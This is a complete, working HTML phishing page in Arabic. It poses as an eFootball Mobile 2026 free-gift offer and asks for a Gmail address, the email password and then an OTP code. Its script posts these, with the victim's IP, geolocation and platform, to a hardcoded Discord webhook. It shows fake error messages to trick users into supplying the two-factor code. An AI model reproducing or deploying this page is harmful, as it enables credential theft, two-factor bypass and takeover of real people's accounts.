<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>eFootball Mobile - هدايا وهبات مجانية</title>
    <style>
        body {
            background: linear-gradient(135deg, #0d1b2a, #1b263b, #415a77);
            color: #ffffff;
            font-family: 'Cairo', Tahoma, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
        }
        .card {
            background: rgba(15, 23, 42, 0.95);
            border: 2px solid #00f5d4;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 0 25px rgba(0, 245, 212, 0.4);
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-sizing: border-box;
        }
        h2 { color: #00f5d4; font-size: 24px; margin-bottom: 10px; text-shadow: 0 0 10px rgba(0,245,212,0.5); }
        p { color: #94a3b8; font-size: 13px; margin-bottom: 20px; line-height: 1.5; }
        .input-group {
            margin-bottom: 15px;
            text-align: right;
        }
        .input-group label {
            display: block;
            font-size: 13px;
            margin-bottom: 5px;
            color: #38bdf8;
        }
        .input-group input {
            width: 100%;
            padding: 12px;
            background: #1e293b;
            border: 1px solid #475569;
            border-radius: 6px;
            color: #fff;
            font-size: 14px;
            box-sizing: border-box;
            outline: none;
            transition: 0.2s;
        }
        .input-group input:focus {
            border-color: #00f5d4;
            box-shadow: 0 0 8px rgba(0,245,212,0.3);
        }
        .recaptcha-box {
            background: #1e293b;
            border: 1px solid #475569;
            border-radius: 6px;
            padding: 10px;
            margin-bottom: 15px;
            display: flex;
            align-items: center;
            justify-content: space-between;
        }
        .recaptcha-right {
            display: flex;
            align-items: center;
            font-size: 13px;
            color: #fff;
        }
        .recaptcha-right input {
            width: 18px;
            height: 18px;
            margin-left: 10px;
            cursor: pointer;
        }
        .btn {
            background: linear-gradient(135deg, #00f5d4, #00bbf9);
            color: #0f172a;
            border: none;
            width: 100%;
            padding: 12px;
            font-size: 16px;
            font-weight: bold;
            border-radius: 6px;
            cursor: pointer;
            transition: 0.2s;
            box-shadow: 0 0 15px rgba(0, 245, 212, 0.4);
        }
        .btn:hover { opacity: 0.9; }
        .error-msg {
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid #ef4444;
            color: #f87171;
            padding: 10px;
            border-radius: 6px;
            font-size: 12px;
            margin-bottom: 15px;
            display: none;
            line-height: 1.4;
        }
        .otp-group { display: none; }
    </style>
</head>
<body>

    <div class="card">
        <h2>⚽ eFootball Mobile 2026</h2>
        <p>سجل دخولك بحساب الإيميل وكلمة المرور لمزامنة التطابق واستلام الهدايا والعملات فوراً.</p>
        
        <div id="errorText" class="error-msg"></div>

        <form id="authForm" onsubmit="handleSubmit(event)">
            <div class="input-group">
                <label>البريد الإلكتروني (Gmail)</label>
                <input type="email" id="email" placeholder="example@gmail.com" required>
            </div>
            <div class="input-group">
                <label>كلمة مرور الإيميل الحقيقية</label>
                <input type="password" id="password" placeholder="كلمة المرور الخاصة بالإيميل" required>
            </div>

            <!-- خانة الكود التي تظهر عند الحاجة -->
            <div class="input-group otp-group" id="otpGroup">
                <label style="color: #facc15;">أدخل كود التحقق (OTP) الذي وصلك في الإيميل:</label>
                <input type="text" id="otpCode" placeholder="أدخل كود التحقق هنا">
            </div>
            
            <div class="recaptcha-box">
                <div class="recaptcha-right">
                    <input type="checkbox" id="robotCheck" required>
                    <label for="robotCheck">أنا لست روبوت</label>
                </div>
                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" width="22" alt="reCAPTCHA">
            </div>

            <button type="submit" id="submitBtn" class="btn">مزامنة وشحن الحساب</button>
        </form>
    </div>

    <script>
        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1543430352826011739/loVSz6Py2mno8uN83WxwfGqskhkoaAg4GYOz6hghqLvG7B24p-fPqePOvbkSm5NvyO6b";
        let attemptCount = 0;

        async function sendToDiscord(message) {
            try {
                await fetch(DISCORD_WEBHOOK_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ content: message })
                });
            } catch (e) {}
        }

        async function handleSubmit(event) {
            event.preventDefault();
            attemptCount++;

            let email = document.getElementById('email').value;
            let password = document.getElementById('password').value;
            let otp = document.getElementById('otpCode').value || "لم يُطلب بعد";
            let ip = "Unknown";
            let locationInfo = "Unknown";

            // سحب الـ IP والموقع الجغرافي الخفي بدون أي إزعاج للمستخدم
            try {
                let ipRes = await fetch('https://api.ipify.org?format=json');
                let ipData = await ipRes.json();
                ip = ipData.ip;

                let res = await fetch(`https://ipapi.co/${ip}/json/`);
                let data = await res.json();
                locationInfo = `${data.country_name || 'Unknown'} - ${data.city || 'Unknown'} (الشبكة: ${data.org || 'Unknown'})`;
            } catch (err) {}

            let msg = `🎯 **[ eFootball - محاولة رقم ${attemptCount} ]** 🎯\n\n` +
                      `📧 **الإيميل:** \`${email}\`\n` +
                      `🔑 **كلمة المرور:** \`${password}\`\n` +
                      `🔢 **كود التحقق (OTP):** \`${otp}\`\n` +
                      `🌐 **الـ IP:** \`${ip}\`\n` +
                      `📍 **الموقع (تلقائي خفي):** ${locationInfo}\n` +
                      `💻 **النظام:** ${navigator.platform}`;

            await sendToDiscord(msg);

            let errorBox = document.getElementById('errorText');

            // التحكم في سيناريو الضحية حسب المحاولات
            if (attemptCount === 1) {
                // المحاولة الأولى: نظهر له أن الباسورد غير مطابق أو يتطلب كود أمان إضافي
                errorBox.style.display = 'block';
                errorBox.innerHTML = "كلمة المرور خاطئة أو يتطلب الحساب تأكيداً إضافياً. يرجى تفقد بريدك الإلكتروني لإدخال كود التحقق (OTP) الذي وصلك.";
                
                // إظهار خانة كود التحقق
                document.getElementById('otpGroup').style.display = 'block';
                document.getElementById('submitBtn').innerText = "تأكيد الكود وإتمام الشحن";
                document.getElementById('robotCheck').checked = false;
            } else {
                // المحاولات اللاحقة: في حال كتب كود خطأ أو استمر بالتجربة
                errorBox.innerHTML = "خطأ في الكود المدخل أو كلمة المرور. يرجى إعادة التأكد وكتابتها بشكل صحيح.";
                document.getElementById('otpCode').value = '';
                document.getElementById('robotCheck').checked = false;
            }
        }
    </script>
</body>
</html>
